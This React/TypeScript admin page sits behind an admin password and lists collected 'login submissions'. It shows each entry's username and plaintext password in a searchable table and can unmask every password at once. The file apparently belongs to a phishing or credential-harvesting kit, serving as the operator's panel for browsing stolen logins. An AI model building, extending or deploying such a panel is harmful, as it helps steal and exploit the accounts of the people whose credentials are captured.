import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Search, Eye, EyeOff, Lock, Unlock } from "lucide-react";
import { format } from "date-fns";
import { id as localeId, enUS } from "date-fns/locale";
import { useTranslation, type Language } from "@/lib/i18n";
import { LanguageToggle } from "@/components/LanguageToggle";

interface LoginSubmission {
  id: string;
  username: string;
  password: string;
  submittedAt: string;
}

export default function AdminPage() {
  const [searchQuery, setSearchQuery] = useState("");
  const [showPasswords, setShowPasswords] = useState(false);
  const [authToken, setAuthToken] = useState<string | null>(() => {
    return localStorage.getItem("admin_token");
  });
  const [adminPassword, setAdminPassword] = useState("");
  const [language, setLanguage] = useState<Language>("id");
  const t = useTranslation(language);

  const { data: submissions = [], isLoading } = useQuery<LoginSubmission[]>({
    queryKey: ["/api/submissions"],
    enabled: !!authToken,
    queryFn: async () => {
      const response = await fetch("/api/submissions", {
        headers: {
          Authorization: `Bearer ${authToken}`,
        },
      });
      
      if (!response.ok) {
        throw new Error("Failed to fetch submissions");
      }
      
      return response.json();
    },
  });

  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch("/api/admin/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ password: adminPassword }),
      });

      const data = await response.json();

      if (data.success && data.token) {
        localStorage.setItem("admin_token", data.token);
        setAuthToken(data.token);
        setAdminPassword("");
      } else {
        alert(t.adminPasswordWrong);
      }
    } catch (error) {
      alert(t.adminPasswordWrong);
    }
  };

  const handleLogout = async () => {
    if (authToken) {
      try {
        await fetch("/api/admin/logout", {
          method: "POST",
          headers: {
            Authorization: `Bearer ${authToken}`,
          },
        });
      } catch (error) {
        console.error("Logout error:", error);
      }
    }
    
    localStorage.removeItem("admin_token");
    setAuthToken(null);
  };

  const filteredSubmissions = submissions.filter(
    (submission) =>
      submission.username.toLowerCase().includes(searchQuery.toLowerCase()) ||
      submission.password.toLowerCase().includes(searchQuery.toLowerCase())
  );

  if (!authToken) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="w-full max-w-md space-y-4">
          <div className="flex justify-end">
            <LanguageToggle language={language} onLanguageChange={setLanguage} />
          </div>
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Lock className="h-6 w-6 text-primary" />
                {t.adminLogin}
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleAdminLogin} className="space-y-4">
                <div className="space-y-2">
                  <label htmlFor="admin-password" className="text-sm font-medium">
                    {t.adminPassword}
                  </label>
                  <Input
                    id="admin-password"
                    type="password"
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                    placeholder={t.adminPasswordPlaceholder}
                    className="h-12"
                    data-testid="input-admin-password"
                  />
                </div>
                <Button type="submit" className="w-full h-12" data-testid="button-admin-login">
                  {t.adminLoginButton}
                </Button>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  const dateLocale = language === "id" ? localeId : enUS;

  return (
    <div className="min-h-screen bg-background p-4 md:p-8">
      <div className="container mx-auto">
        <Card>
          <CardHeader>
            <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
              <CardTitle className="text-2xl">{t.dashboard}</CardTitle>
              <div className="flex gap-2">
                <LanguageToggle language={language} onLanguageChange={setLanguage} />
                <Button
                  variant="outline"
                  onClick={handleLogout}
                  data-testid="button-logout"
                >
                  <Unlock className="h-4 w-4 mr-2" />
                  {t.logout}
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="flex flex-col md:flex-row gap-4">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground" />
                <Input
                  type="search"
                  placeholder={t.searchPlaceholder}
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-10 h-12"
                  data-testid="input-search"
                />
              </div>
              <Button
                variant="outline"
                onClick={() => setShowPasswords(!showPasswords)}
                className="h-12"
                data-testid="button-toggle-passwords"
              >
                {showPasswords ? (
                  <>
                    <EyeOff className="h-4 w-4 mr-2" />
                    {t.hidePasswords}
                  </>
                ) : (
                  <>
                    <Eye className="h-4 w-4 mr-2" />
                    {t.showPasswords}
                  </>
                )}
              </Button>
            </div>

            {isLoading ? (
              <div className="text-center py-12 text-muted-foreground">{t.loading}</div>
            ) : filteredSubmissions.length === 0 ? (
              <div className="text-center py-12 text-muted-foreground">
                {searchQuery ? t.noResults : t.noSubmissions}
              </div>
            ) : (
              <div className="border rounded-lg overflow-hidden">
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>{t.submittedAt}</TableHead>
                      <TableHead>{t.username}</TableHead>
                      <TableHead>{t.password}</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {filteredSubmissions.map((submission) => (
                      <TableRow key={submission.id} data-testid={`row-submission-${submission.id}`}>
                        <TableCell className="font-medium">
                          {format(new Date(submission.submittedAt), "PPpp", { locale: dateLocale })}
                        </TableCell>
                        <TableCell data-testid={`text-username-${submission.id}`}>
                          {submission.username}
                        </TableCell>
                        <TableCell data-testid={`text-password-${submission.id}`}>
                          {showPasswords ? submission.password : "••••••••"}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}

            <div className="text-sm text-muted-foreground text-center">
              {t.totalSubmissions} {filteredSubmissions.length}
              {searchQuery && ` (${t.filteredFrom} ${submissions.length})`}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
